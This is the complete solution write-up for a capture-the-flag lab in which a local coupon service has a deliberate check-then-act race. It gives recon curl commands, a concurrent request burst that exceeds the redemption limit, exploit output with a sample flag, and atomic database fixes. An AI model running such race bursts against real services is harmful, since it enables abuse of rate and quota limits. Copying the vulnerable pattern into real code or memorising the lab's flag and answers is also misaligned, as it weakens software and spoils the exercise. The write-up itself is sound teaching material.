# w15 Rate Gauntlet :: solution

## Root cause

`app/server.py`, `_redemption()` — the entire check-then-act:

```python
conn = _db()
try:
    # --- check -----------------------------------------------------------
    row = conn.execute(
        "SELECT COUNT(*) FROM redemptions WHERE account = ?", (account,)
    ).fetchone()
    count = row[0]

    if count >= LIMIT:
        return {"ok": False, "status": "denied", "account": account,
                "used": count, "limit": LIMIT,
                "message": f"coupon limit reached ({count}/{LIMIT})"}

    # ponytail: deliberate TOCTOU window, makes the race deterministic.
    time.sleep(WINDOW_MS / 1000.0)

    # --- act -------------------------------------------------------------
    conn.execute(
        "INSERT INTO redemptions (account, coupon, ts) VALUES (?, ?, ?)",
        (account, coupon, time.time()),
    )
```

The limit is enforced by exactly one thing: the `count >= LIMIT` comparison on a
value read by an earlier statement. That value is a **snapshot**, and nothing
carries it forward to the `INSERT`:

- the connection is opened with `isolation_level = None` (autocommit), so the
  `SELECT` is not part of any transaction that the `INSERT` would join;
- there is deliberately **no `BEGIN IMMEDIATE`**, so no write lock is taken
  while the count is being validated;
- there is no `UNIQUE` / `CHECK` constraint and no `INSERT ... SELECT` that would
  make the database itself re-evaluate the count atomically at write time.

`time.sleep` in the middle is not the bug — it is a magnifier. It turns a race
that would be won only by a lucky scheduling gap on one core into one that is
won **every time, on any number of cores**, because all N handlers are parked in
the same 400 ms window when the first `INSERT` lands. That determinism is the
point of the lab: an "easy" race has to be reliably winnable.

Each request gets a **fresh connection** (`_db()` is called per request, with
`check_same_thread=False`), so the handlers are genuinely in flight at once —
they are not serialized behind a single connection.

## Recon

The landing page states the policy (`<meta name="lab" content="w15">`), and the
health endpoint gives the parameters you need to size the burst:

```bash
curl -s http://localhost:30015/api/health
# {"service":"rate-gauntlet","lab":"w15","version":"1.15.0",
#  "limit":3,"window_ms":400,"concurrency":"ThreadingHTTPServer",...}
```

`limit` 3 and `window_ms` 400 tells you: send more than 3 requests, all of them
inside a 400 ms window, and the count is stale for all of them.

Confirm the limit is **actually enforced** before attacking it — otherwise a
"success" proves nothing:

```bash
curl -s -X POST http://localhost:30015/api/redeem \
  -H 'content-type: application/json' -d '{"account":"alice"}'
# {"ok":true,"status":"redeemed","account":"alice","used":1,"limit":3}
```

Repeat three more times and the fourth is refused:

```bash
curl -s http://localhost:30015/api/state?account=alice
# {"account":"alice","used":3,"limit":3,"remaining":0,"over_limit":false}

curl -s -X POST http://localhost:30015/api/redeem \
  -H 'content-type: application/json' -d '{"account":"alice"}'
# {"ok":false,"status":"denied","used":3,"limit":3,
#  "message":"coupon limit reached (3/3)"}
```

The control works. The bug is only in the *simultaneous* path.

## Exploit

Use a fresh account (so the burst starts from zero) and fire more requests than
the limit, concurrently:

```bash
python solution/exploit.py
```

```
[*] target  http://localhost:30015  limit=3 window_ms=400
[*] account racer-48213907  burst=12
[*] results: 12 over-limit, 0 denied by the check
[*] final count for racer-48213907: 12 / limit 3
[+] FLAG: hex4b0t{verifytest123456}
```

Note `0 denied by the check`: not one of the twelve requests saw a count at or
above the limit, even though the last ones to be *written* clearly should have.
They all read the same stale `0`.

The same thing by hand, if you want to see it without the script:

```bash
ACC="manual-$(date +%s)"
for i in $(seq 1 12); do
  curl -s -X POST http://localhost:30015/api/redeem \
    -H 'content-type: application/json' -d "{\"account\":\"$ACC\"}" &
done
wait
# several replies carry "status":"limit_exceeded" and a "flag" field
curl -s "http://localhost:30015/api/state?account=$ACC"
# {"account":"manual-...","used":12,"limit":3,"over_limit":true}
```

The flag comes back in whichever response performed the insert that pushed the
post-insert count past `LIMIT` — the handler re-counts *after* writing, and that
is the only place the overrun is observable.

## The fix

The instinct is to "add a lock". Where the lock goes decides whether the fix
works:

**Wrong: a lock in the request thread, around the check only.** Wrapping just
the `SELECT` in a `threading.Lock` fixes nothing — the lock is released before
the `INSERT`, so the count is corrupt again by the time the write happens. You
have serialized the reads and left the check-then-act gap exactly where it was.

**Wrong: a lock in the application, around check *and* act, for one worker.**
This does close the window in-process. It also does not survive the deployment
it is about to meet: the moment a second process or replica runs, two separate
locks on two separate machines both think they hold the account. An app-level
mutex is a *per-process* mutex; a redemption limit is a *shared invariant*. In
this lab there is one worker, so an app lock would appear to work — and that is
the trap.

The invariant belongs to the database, and it should be enforced by a single
statement that reads and writes under one lock:

**Option A — one atomic statement.** Let the database do the check and the write
in the same statement, so no snapshot can go stale:

```python
conn.execute("BEGIN IMMEDIATE")          # take the write lock first
cur = conn.execute("""
    INSERT INTO redemptions (account, coupon, ts)
    SELECT ?, ?, ?
    WHERE (SELECT COUNT(*) FROM redemptions WHERE account = ?) < ?
""", (account, coupon, time.time(), account, LIMIT))
if cur.rowcount == 0:
    conn.execute("ROLLBACK")
    return denied_response()
conn.execute("COMMIT")
```

`BEGIN IMMEDIATE` acquires the write lock *before* the count is read, so a
second writer cannot read the same count and queue behind it. (Plain
`BEGIN DEFERRED`, the default, takes a read lock first and upgrades on write —
which is the same race in a new costume.) With `rowcount == 0` you know
atomically that the insert lost, and you deny without having written anything.

**Option B — a database constraint.** If the policy is "at most N rows per
account per window", model the row that *is* the quota instead of counting rows:

```sql
CREATE TABLE redemptions (
    account TEXT NOT NULL,
    slot    INTEGER NOT NULL,          -- 0 .. LIMIT-1
    coupon  TEXT NOT NULL,
    ts      REAL NOT NULL,
    PRIMARY KEY (account, slot)        -- the limit, enforced by the engine
);
```

Insert into `slot` computed from the current count; a duplicate `slot` is a
`UNIQUE` violation and the request is denied. The limit is now a schema
property, and no amount of concurrency can produce `LIMIT + 1` rows.

Both options have the same shape: **one atomic operation, owned by the store
that holds the data.** The reason the app-level check cannot be saved by a lock
"in the wrong scope" is that the scope of the lock has to cover every writer of
the account, and no `threading.Lock` reaches a process that has not started yet.

## Flag

Injected at runtime into `W0B_FLAG`; there is no static value to hardcode. The
database is per-boot scratch space (`/tmp/gauntlet.db`), so counts reset on
restart and the flag does not change.

## Submit

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```
